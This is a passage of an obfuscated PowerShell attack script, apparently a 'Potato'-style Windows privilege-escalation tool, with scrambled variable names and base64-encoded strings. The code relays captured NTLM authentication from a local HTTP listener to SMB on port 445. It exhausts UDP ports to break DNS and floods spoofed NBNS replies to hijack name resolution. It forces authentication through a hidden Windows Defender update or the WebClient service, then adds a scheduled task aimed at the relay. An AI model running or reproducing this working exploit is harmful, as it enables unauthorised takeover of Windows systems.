            ${/=\_/\____/=\/\/=} = ${/=\_/\____/=\/\/=} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))),''
            [byte[]] ${_/==\___/\/\_____/} = [System.Convert]::FromBase64String(${/=\_/\____/=\/\/=})
            ${__/\__/\/=\___/==}.response_StatusCode = 0x34,0x30,0x31
            ${/=\_/\/\/=\_/=\/=} = 0x4f,0x4b
            if (${_/==\___/\/\_____/}[8] -eq 1)
            {
                if(${__/\__/\/=\___/==}.SMB_relay_active_step -eq 0)
                {
                    ${__/\__/\/=\___/==}.SMB_relay_active_step = 1
                    ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - ${/=\_____/\/=\/\__} to SMB relay triggered by " + ${__/\__/\/=\___/==}.HTTP_client.Client.RemoteEndpoint.Address)
                    ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Grabbing challenge for relay from " + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAC8APQBcAC8AXABfAC8APQBcAF8AXwBfAF8ALwB9AA=='))))
                    ${_/===\___/=\/\_/==} = New-Object System.Net.Sockets.TCPClient
                    ${_/===\___/=\/\_/==}.connect(${_/\/=\/\_/=\____/},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADUA'))))
                    if(!${_/===\___/=\/\_/==}.connected)
                    {
                        ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - SMB relay target is not responding")
                        ${__/\__/\/=\___/==}.SMB_relay_active_step = 0
                    }
                    if(${__/\__/\/=\___/==}.SMB_relay_active_step -eq 1)
                    {
                        ${__/========\/\/\/} = _/=\__/\_/=\/==\/\ ${_/===\___/=\/\_/==} ${_/==\___/\/\_____/}
                        ${__/\__/\/=\___/==}.SMB_relay_active_step = 2
                        ${__/========\/\/\/} = ${__/========\/\/\/}[2..${__/========\/\/\/}.Length]
                        ${___/\/=\/==\__/\_/} = ${__/========\/\/\/}[34..33]
                        ${_/==\/\_/\_____/=} = [System.BitConverter]::ToString(${__/========\/\/\/})
                        ${_/==\/\_/\_____/=} = ${_/==\/\_/\_____/=} -replace "-",""
                        ${/==\_/=\_/\__/==\} = ${_/==\/\_/\_____/=}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
                        ${/\_____/\/\/\/===} = ${/==\_/=\_/\__/==\} / 2
                        ${_/==\___/===\_/\/} = __/\_/\/\/===\/\_/ (${/\_____/\/\/\/===} + 12) ${__/========\/\/\/}
                        ${_/===\_/===\/\/\/} = ${__/========\/\/\/}[(${/\_____/\/\/\/===} + 12)..(${/\_____/\/\/\/===} + 19)]
                        ${____/=\/\_/===\__} = __/\_/\/\/===\/\_/ (${/\_____/\/\/\/===} + 40) ${__/========\/\/\/}
                        ${_/==\/===\__/=\/=} = ${__/========\/\/\/}[(${/\_____/\/\/\/===} + 40)..(${/\_____/\/\/\/===} + 55 + ${_/==\___/===\_/\/})]
                        ${/==\/====\/=\/=\_} = ${__/========\/\/\/}[(${/\_____/\/\/\/===} + 24)..(${/\_____/\/\/\/===} + 31)]
                        ${__/\/===\/==\___/} = ${__/========\/\/\/}[(${/\_____/\/\/\/===} + 32)..(${/\_____/\/\/\/===} + 39)]
                        ${___/\___/=\/=\/\_} = ${__/========\/\/\/}[(${/\_____/\/\/\/===} + 56 + ${_/==\___/===\_/\/})..(${/\_____/\/\/\/===} + 55 + ${_/==\___/===\_/\/} + ${____/=\/\_/===\__})]
                        ${________/\___/\/=} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                                           ${_/===\_/===\/\/\/} +
                                           0x05,0xc2,0x89,0xa2 +
                                           ${/==\/====\/=\/=\_} +
                                           ${__/\/===\/==\___/} +
                                           ${_/==\/===\__/=\/=} +
                                           ${___/\___/=\/=\/\_}
                        ${/=\/=\/\/\__/=\__} = [System.Convert]::ToBase64String(${________/\___/\/=})
                        ${_/=====\__/\/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))) + ${/=\/=\/\/\__/=\__}
                        ${/==\_/==\_/\__/\/} = __/=======\_/====\ ${__/========\/\/\/}
                        ${__/\__/\/=\___/==}.HTTP_challenge_queue.Add(${__/\__/\/=\___/==}.HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString + ${__/\__/\/=\___/==}.HTTP_client.Client.RemoteEndpoint.Port + ',' + ${/==\_/==\_/\__/\/})
                        ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Received challenge ${/==\_/==\_/\__/\/} " + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBvAHIAIAByAGUAbABhAHkAIABmAHIAbwBtACAAJAB7AF8ALwBcAC8APQBcAC8AXABfAC8APQBcAF8AXwBfAF8ALwB9AA=='))))
                        ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Providing challenge " + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwAvAD0APQBcAF8ALwBcAF8AXwAvAFwALwB9ACAAZgBvAHIAIAByAGUAbABhAHkAIAB0AG8AIAA='))) + ${__/\__/\/=\___/==}.HTTP_client.Client.RemoteEndpoint.Address)
                        ${__/\__/\/=\___/==}.SMB_relay_active_step = 3
                    }
                    else
                    {
                        ${_/=====\__/\/==\/} = _/==\/=\__/\/\/\/=
                    }
                }
                else
                {
                     ${_/=====\__/\/==\/} = _/==\/=\__/\/\/\/=
                }
                ${__/\__/\/=\___/==}.response_StatusCode = 0x34,0x30,0x31
                ${/=\_/\/\/=\_/=\/=} = 0x4f,0x4b
            }
            elseif (${_/==\___/\/\_____/}[8] -eq 3)
            {
                ${_/=====\__/\/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
                ${_/=====\/\____/\/} = ${_/==\___/\/\_____/}[24]
                ${/==\/==\/=\_/\/==} = __/\_/\/\/===\/\_/ 22 ${_/==\___/\/\_____/}
                ${_/=========\/\/\_} = __/\_/\/\/===\/\_/ 28 ${_/==\___/\/\_____/}
                ${__/\_/====\/=\__/} = __/\_/\/\/===\/\_/ 32 ${_/==\___/\/\_____/}
                if(${_/=========\/\/\_} -eq 0)
                {
                    ${/==\/===\/=\/====} = ''
                }
                else
                {  
                    ${/==\/===\/=\/====} = _/=====\__/\_/==\/ ${_/=========\/\/\_} 0 0 ${__/\_/====\/=\__/} ${_/==\___/\/\_____/}
                }
                ${_/\/\__/==\/\__/\} = __/\_/\/\/===\/\_/ 36 ${_/==\___/\/\_____/}
                ${_/\/=\__/\/=\/=\_} = __/\_/\/\/===\/\_/ 44 ${_/==\___/\/\_____/}
                if ([System.BitConverter]::ToString(${_/==\___/\/\_____/}[16]) -eq '58' -and [System.BitConverter]::ToString(${_/==\___/\/\_____/}[24]) -eq '58' -and [System.BitConverter]::ToString(${_/==\___/\/\_____/}[32]) -eq '58')
                {
                    ${/=\_/==\/\/=\/=\_} = ''
                    ${__/=\_/\_/\/==\/=} = ''
                }
                else
                {
                    ${/=\_/==\/\/=\/=\_} = _/=====\__/\_/==\/ ${_/\/\__/==\/\__/\} ${_/=========\/\/\_} 0 ${__/\_/====\/=\__/} ${_/==\___/\/\_____/}
                    ${__/=\_/\_/\/==\/=} = _/=====\__/\_/==\/ ${_/\/=\__/\/=\/=\_} ${_/=========\/\/\_} ${_/\/\__/==\/\__/\} ${__/\_/====\/=\__/} ${_/==\___/\/\_____/}
                }
                ${____/==\/===\____} = [System.BitConverter]::ToString(${_/==\___/\/\_____/}[${_/=====\/\____/\/}..(${_/=====\/\____/\/} + ${/==\/==\/=\_/\/==})]) -replace "-",""
                ${____/==\/===\____} = ${____/==\/===\____}.Insert(32,':')
                ${__/\__/\/=\___/==}.response_StatusCode = 0x32,0x30,0x30
                ${/=\_/\/\/=\_/=\/=} = 0x4f,0x4b
                ${/==\_/==\_/\__/\/} = ''
                if (${__/\__/\/=\___/==}.SMB_relay_active_step -eq 3)
                {
                    ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Sending response for " + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwALwA9AD0APQBcAC8APQBcAC8APQA9AD0APQB9AFwAJAB7AC8APQBcAF8ALwA9AD0AXAAvAFwALwA9AFwALwA9AFwAXwB9ACAAZgBvAHIAIAByAGUAbABhAHkAIAB0AG8AIAA='))) + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAC8APQBcAC8AXABfAC8APQBcAF8AXwBfAF8ALwB9AA=='))))
                    ${/==\/\/=====\__/=} = ____/==\/\_/=\/=\_ ${_/===\___/=\/\_/==} ${_/==\___/\/\_____/} ${___/\/=\/==\__/\_/}
                    ${/==\/\/=====\__/=} = ${/==\/\/=====\__/=}[1..${/==\/\/=====\__/=}.Length]
                    if(!${__/\/===\_____/\_} -and [System.BitConverter]::ToString(${/==\/\/=====\__/=}[9..12]) -eq ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))))
                    {
                        ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - ${/=\_____/\/=\/\__} to SMB relay " + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAAcwB1AGMAYwBlAHMAcwBmAHUAbAAgAGYAbwByACAAJAB7AC8APQA9AFwALwA9AD0APQBcAC8APQBcAC8APQA9AD0APQB9AFwA'))) + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8ALwA9AD0AXAAvAFwALwA9AFwALwA9AFwAXwB9ACAAbwBuACAAJAB7AF8ALwBcAC8APQBcAC8AXABfAC8APQBcAF8AXwBfAF8ALwB9AA=='))))
                        ${__/\__/\/=\___/==}.SMB_relay_active_step = 4
                        ___/\__/=\/=\/==== ${_/===\___/=\/\_/==} ${___/\/=\/==\__/\_/}          
                    }
                    else
                    {
                        ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - ${/=\_____/\/=\/\__} to SMB relay " + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAAZgBhAGkAbABlAGQAIABmAG8AcgAgACQAewAvAD0APQBcAC8APQA9AD0AXAAvAD0AXAAvAD0APQA9AD0AfQBcAA=='))) + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8ALwA9AD0AXAAvAFwALwA9AFwALwA9AFwAXwB9ACAAbwBuACAAJAB7AF8ALwBcAC8APQBcAC8AXABfAC8APQBcAF8AXwBfAF8ALwB9AA=='))))
                        ${__/\__/\/=\___/==}.SMB_relay_active_step = 0
                        ${_/===\___/=\/\_/==}.Close()
                    }
                }
            }
            else
            {
                ${_/=====\__/\/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
            }
        }
        ${_/===\____/\___/\} = Get-Date -format r
        ${_/===\____/\___/\} = [System.Text.Encoding]::UTF8.GetBytes(${_/===\____/\___/\})
        ${/=\___/==\_/\/\_/} = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,
                                        0x74,0x65,0x3a,0x20
        if(${_/=====\__/\/==\/})
        {
            ${_/=====\__/\/==\/} = [System.Text.Encoding]::UTF8.GetBytes(${_/=====\__/\/==\/})
            ${___/\/\_/\/\_/\_/} = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                             ${__/\__/\/=\___/==}.response_StatusCode +
                             0x20 +
                             ${/=\_/\/\/=\_/=\/=} +
                             0x0d,0x0a,0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,
                             0x20,0x70,0x72,0x69,0x76,0x61,0x74,0x65,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
                             0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,
                             0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,
                             0x0d,0x0a,0x45,0x78,0x70,0x69,0x72,0x65,0x73,0x3a,0x20,0x4d,0x6f,0x6e,0x2c,0x20,
                             0x30,0x31,0x20,0x4a,0x61,0x6e,0x20,0x30,0x30,0x30,0x31,0x20,0x30,0x30,0x3a,0x30,
                             0x30,0x3a,0x30,0x30,0x20,0x47,0x4d,0x54,0x0d,0x0a +
                             ${/=\___/==\_/\/\_/} +
                             ${_/=====\__/\/==\/} +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,
                             0x3a,0x20,0x30,0x0d,0x0a,0x0d,0x0a
        }
        elseif(${/=\___/\____/==\/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBQAEEARAA='))))
        {
            ${___/\/\_/\/\_/\_/} = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                             ${__/\__/\/=\___/==}.response_StatusCode +
                             0x20 +
                             ${/=\_/\/\/=\_/=\/=} +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,
                             0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,
                             0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
                             0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 +
                             ${_/\_____/=\___/\/} +
                             0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,
                             0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,
                             0x0a,0x44,0x61,0x74,0x65,0x3a +
                             ${_/===\____/\___/\} +
                             0x0d,0x0a,0x0d,0x0a +
                             ${______/\____/\/=\} 
        }
        elseif(${/=\___/\____/==\/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGQAaQByAGUAYwB0AA=='))))
        {
            ${___/\/\_/\/\_/\_/} = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                             ${__/\__/\/=\___/==}.response_StatusCode +
                             0x20 +
                             ${/=\_/\/\/=\_/=\/=} +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,
                             0x3a,0x20,0x30,0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,
                             0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,
                             0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a +
                             ${/==\/==\_/\/\/=\_} +
                             0x44,0x61,0x74,0x65,0x3a +
                             ${_/===\____/\___/\} +
                             0x0d,0x0a,0x0d,0x0a
        }
        else
        {
            ${___/\/\_/\/\_/\_/} = 0x48,0x54,0x54,0x50,0x2f,0x31,0x20 +
                             ${__/\__/\/=\___/==}.response_StatusCode +
                             0x20 +
                             ${/=\_/\/\/=\_/=\/=} +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,
                             0x3a,0x20,0x31,0x30,0x37,0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,
                             0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,
                             0x2f,0x32,0x2e,0x30,0x0d,0x0a,0x44,0x61,0x74,0x65,0x3a +
                             ${_/===\____/\___/\} +
                             0x0d,0x0a,0x0d,0x0a
        }
        ${_/=\_/==\_/=====\}.Write(${___/\/\_/\/\_/\_/},0,${___/\/\_/\/\_/\_/}.Length)
        ${_/=\_/==\_/=====\}.Flush()
        start-sleep -s 1
        ${__/\__/\/=\___/==}.request_RawUrl_old = ${__/\__/\/=\___/==}.request_RawUrl
        ${__/\__/\/=\___/==}.HTTP_client_handle_old= ${__/\__/\/=\___/==}.HTTP_client.Client.Handle
    }
}
${__/\/\/\__/\/=\/\} = 
{
    ${__/\__/\/=\___/==}.exhaust_UDP_running = $true
    ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Trying to exhaust UDP source ports so DNS lookups will fail")
    ${_/=\/=\/\/==\____} = New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBHAGUAbgBlAHIAaQBjAC4ATABpAHMAdABbAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFMAbwBjAGsAZQB0AF0A')))
    ${_/=\/\/=\/\_/====} = New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBHAGUAbgBlAHIAaQBjAC4ATABpAHMAdABbAEkAbgB0AF0A')))
    ${/==\__/\__/=\/=\/}=0
    for (${/==\__/\__/=\/=\/} = 0; ${/==\__/\__/=\/=\/} -le 65535; ${/==\__/\__/=\/=\/}++)
    {
        try
        {
            if (${/==\__/\__/=\/=\/} -ne 137 -and ${/==\__/\__/=\/=\/} -ne 53)
            {
                ${____/\_/\/\_/=\/=} = New-Object System.Net.IPEndpoint([System.Net.IPAddress]::Any,${/==\__/\__/=\/=\/})
                ${/=\_/\/\____/\/==} = New-Object Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Dgram,[System.Net.Sockets.ProtocolType]::Udp)
                ${/=\_/\/\____/\/==}.Bind(${____/\_/\/\_/=\/=})
                ${_/=\/=\/\/==\____}.Add(${/=\_/\/\____/\/==})
            }
        }
        catch
        {
            ${_/=\/\/=\/\_/====}.Add(${/==\__/\__/=\/=\/});
            ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Couldn't bind to UDP port ${/==\__/\__/=\/=\/}")
        }
    }
    ${__/\__/\/=\___/==}.UDP_exhaust_success = $false
    while (!${__/\__/\/=\___/==}.UDP_exhaust_success)
    {
        if(!${/=\__/=\/=\__/==\})
        {
            ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Flushing DNS resolver cache")
            ${/=\__/=\/=\__/==\} = $true
        }
        ___/===\/==\_/====
        try
        {
            [System.Net.Dns]::GetHostEntry($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQA='))))
        }
        catch
        {
            ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - DNS lookup failed so UDP exhaustion worked")
            ${__/\__/\/=\___/==}.UDP_exhaust_success = $true
            break
        }
        ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - DNS lookup succeeded so UDP exhaustion failed")
        foreach (${/======\/\_/\____} in ${_/=\/\/=\/\_/====})
        {
            try
            {
                ${____/\_/\/\_/=\/=} = New-Object System.Net.IPEndpoint([System.Net.IPAddress]::Any,${/==\__/\__/=\/=\/})
                ${/=\_/\/\____/\/==} = New-Object Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Dgram,[System.Net.Sockets.ProtocolType]::Udp)
                ${/=\_/\/\____/\/==}.Bind(${____/\_/\/\_/=\/=})
                ${_/=\/=\/\/==\____}.Add(${/=\_/\/\____/\/==})
                $UDP_failed_ports.Remove(${/======\/\_/\____})
            }
            catch
            {
                ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Failed to bind to ${/======\/\_/\____} during cleanup")
            }
        }
    }
    ${__/\__/\/=\___/==}.exhaust_UDP_running = $false
}
${__/\/=\/\_/\___/\} = 
{
    param ($IP,$SpooferIP,$Hostname,$NBNSLimit)
    $Hostname = $Hostname.ToUpper()
    ${_/\/\/\__/=\/====} = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                      0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00
    ${_/\_/=\__/\_/\/==} = [System.Text.Encoding]::UTF8.GetBytes($Hostname)
    ${_/\_/=\__/\_/\/==} = [System.BitConverter]::ToString(${_/\_/=\__/\_/\/==})
    ${_/\_/=\__/\_/\/==} = ${_/\_/=\__/\_/\/==}.Replace("-","")
    ${_/\_/=\__/\_/\/==} = [System.Text.Encoding]::UTF8.GetBytes(${_/\_/=\__/\_/\/==})
    for (${/==\__/\__/=\/=\/}=0; ${/==\__/\__/=\/=\/} -lt ${_/\_/=\__/\_/\/==}.Count; ${/==\__/\__/=\/=\/}++)
    {
        if(${_/\_/=\__/\_/\/==}[${/==\__/\__/=\/=\/}] -gt 64)
        {
            ${_/\/\/\__/=\/====}[${/==\__/\__/=\/=\/}] = ${_/\_/=\__/\_/\/==}[${/==\__/\__/=\/=\/}] + 10
        }
        else
        {
            ${_/\/\/\__/=\/====}[${/==\__/\__/=\/=\/}] = ${_/\_/=\__/\_/\/==}[${/==\__/\__/=\/=\/}] + 17
        }
    }
    ${__/\/=\__/===\_/=} = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                            ${_/\/\/\__/=\/====} +
                            0x00,0x20,0x00,0x01,0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00 +
                            ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
                            0x00,0x00,0x00,0x00
    while(${__/\__/\/=\___/==}.exhaust_UDP_running)
    {
        sleep -s 2
    }
    ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Flushing DNS resolver cache")
    ___/===\/==\_/====
    ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Starting NBNS spoofer to resolve $Hostname to $SpooferIP")
    ${/\____/=\__/=====} = New-Object System.Net.Sockets.UdpClient(137)
    ${__/=\___/\_____/\} = [System.Net.IPAddress]::Parse($IP)
    ${/=\__/==\_/====\/} = New-Object Net.IPEndpoint(${__/=\___/\_____/\},137)
    ${/\____/=\__/=====}.Connect(${/=\__/==\_/====\/})
    while (${__/\__/\/=\___/==}.running)
    {
        :NBNS_spoofer_loop while (!${__/\__/\/=\___/==}.hostname_spoof -and ${__/\__/\/=\___/==}.running)
        {
            for (${/==\__/\__/=\/=\/} = 0; ${/==\__/\__/=\/=\/} -lt 255; ${/==\__/\__/=\/=\/}++)
            {
                for (${_/==\/\/\__/=\___} = 0; ${_/==\/\/\__/=\___} -lt 255; ${_/==\/\/\__/=\___}++)
                {
                    ${__/\/=\__/===\_/=}[0] = ${/==\__/\__/=\/=\/}
                    ${__/\/=\__/===\_/=}[1] = ${_/==\/\/\__/=\___}                 
                    ${/\____/=\__/=====}.Send(${__/\/=\__/===\_/=},${__/\/=\__/===\_/=}.Length)
                    if(${__/\__/\/=\___/==}.hostname_spoof -and $NBNSLimit -eq 'Y')
                    {
                        break NBNS_spoofer_loop
                    }
                }
            }
        }
        sleep -m 5
    }
    ${/\____/=\__/=====}.Close()
 }
${/==\____/\__/\/\/} = 
{
    param ($NBNS,$NBNSLimit,$RunTime,$SpooferIP,$Hostname,$HTTPPort)
    if($RunTime)
    {    
        ${/\____/===\/\_/==} = new-timespan -Minutes $RunTime
        ${__/\_/\/===\_/===} = [System.Diagnostics.Stopwatch]::StartNew()
    }
    while (${__/\__/\/=\___/==}.running)
    {
        if(${__/\__/\/=\___/==}.trigger -ne 2)
        {
            try
            {
                ${/==\_/=\/==\/\/=\} = [System.Net.Dns]::GetHostEntry($Hostname).AddressList[0].IPAddressToString
            }
            catch
            {
            }
            if(${/==\_/=\/==\/\/=\} -eq $SpooferIP)
            {
                if(!${/=\/==\___/=\_/==})
                {
                    ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - $Hostname has been spoofed to $SpooferIP")
                    ${/=\/==\___/=\_/==} = $true
                }
                if($NBNSLimit -eq 'Y')
                {
                    ${__/\__/\/=\___/==}.hostname_spoof = $true
                }
                ${/==\_/\/\/\_/\__/} = $true
                ${/==\_/=\/==\/\/=\} = ""
            }
            elseif((!${/==\_/=\/==\/\/=\} -or ${/==\_/=\/==\/\/=\} -ne $SpooferIP) -and $NBNS -eq 'Y')
            {
                ${__/\__/\/=\___/==}.hostname_spoof = $false
                ${/==\_/\/\/\_/\__/} = $false
            }
        }
        if(!${__/\__/\/=\___/==}.SMBRelay_success -and ${__/\__/\/=\___/==}.trigger -eq 1)
        {
            if(Test-Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQA='))))
            {
                if((${/===\/=\__/\_/=\/}.HasExited -or !${/===\/=\__/\_/=\/}) -and !${__/\__/\/=\___/==}.SMB_relay_success -and ${/==\_/\/\/\_/\__/})
                {
                    ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Running Windows Defender signature update")
                    ${/===\/=\__/\_/=\/} = saps -FilePath $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQA='))) -Argument SignatureUpdate -WindowStyle Hidden -passthru
                }
            }
            else
            {
                ${__/\__/\/=\___/==}.console_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAgAG4AbwB0ACAAZgBvAHUAbgBkAA=='))))
            }
        }
        elseif(!${__/\__/\/=\___/==}.SMBRelay_success -and ${__/\__/\/=\___/==}.trigger -eq 2)
        {
            ${_/\____/=\/=\___/} = gsv WebClient
            if(${_/\____/=\/=\___/}.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABwAGUAZAA='))))
            {
                ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Starting WebClient service")
                saps -FilePath $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBtAGQALgBlAHgAZQA='))) -Argument $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBDACAAcAB1AHMAaABkACAAXABcAGwAaQB2AGUALgBzAHkAcwBpAG4AdABlAHIAbgBhAGwAcwAuAGMAbwBtAFwAdABvAG8AbABzAA=='))) -WindowStyle Hidden -passthru -Wait
            }
            if(${_/\____/=\/=\___/}.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwA='))) -and !${__/\__/\/=\___/==}.task_added -and !${__/\__/\/=\___/==}.SMBRelay_success)
            {
                ${__/\_/===\/==\_/\} = (Get-Date).AddMinutes(1)
                ${_/==\/====\____/\} = ${__/\_/===\/==\_/\}.ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABIADoAbQBtAA=='))))
                ${__/\__/\/=\___/==}.task = ${__/\__/\/=\___/==}.taskname
                if(${__/\__/\/=\___/==}.task_delete)
                {
                    ${__/\__/\/=\___/==}.task += "_"
                    ${__/\__/\/=\___/==}.task += Get-Random   
                }
                ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Adding scheduled task " + ${__/\__/\/=\___/==}.task)
                ${___/\__/=\/==\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBDACAAcwBjAGgAdABhAHMAawBzAC4AZQB4AGUAIAAvAEMAcgBlAGEAdABlACAALwBUAE4AIAA='))) + ${__/\__/\/=\___/==}.task + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAvAFQAUgAgACAAXABcADEAMgA3AC4AMAAuADAALgAxAEAAJABIAFQAVABQAFAAbwByAHQAXAB0AGUAcwB0ACAALwBTAEMAIABPAE4AQwBFACAALwBTAFQAIAAkAHsAXwAvAD0APQBcAC8APQA9AD0APQBcAF8AXwBfAF8ALwBcAH0AIAAvAEYA')))
